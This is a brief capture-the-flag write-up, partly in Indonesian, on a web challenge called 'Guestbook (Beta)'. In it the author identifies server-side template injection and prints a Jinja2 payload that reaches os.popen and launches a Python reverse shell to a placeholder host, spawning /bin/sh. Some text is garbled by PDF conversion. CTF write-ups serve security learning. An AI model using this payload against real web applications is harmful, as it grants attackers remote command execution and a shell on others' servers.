# 0byteCTF 2023
CTF writeup for The 0byteCTF 2023. I took part in this CTF competition with the Waifuku JETSUKII Waifu Mu ?? team but i solo player literally wkwkw

| Category | Challenge |
| --- | --- |
| Web | [Guestbook (Beta)]

<a name="br1"></a> 



**0bytecꢀ2023**



<a name="br2"></a> 

**user**

**soal**

Tampilan web



<a name="br3"></a> 

Otak :

Pertama dikarenakan tampilan seperꢀ itu langsung felaling SSTI karena pernah

nemuin dan benar

Saya menggunakan pyload jinja RCE



<a name="br4"></a> 

*{% for x in ().class.base.subclasses() %}{% if "warning" in x.name*

*%}{{x().\_module.builꢀns['\_\_import\_\_']('os').popen("python3 -c 'import*

*socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.con*

*nect(("x.x.x.x",PORT));os.dup2(s.ﬁleno(),0); os.dup2(s.ﬁleno(),1);*

*os.dup2(s.ﬁleno(),2);p=subprocess.call(["/bin/sh", "-i"]);'")}}{%endif%}{% endfor %}*

Langsung eksekusi

Connect

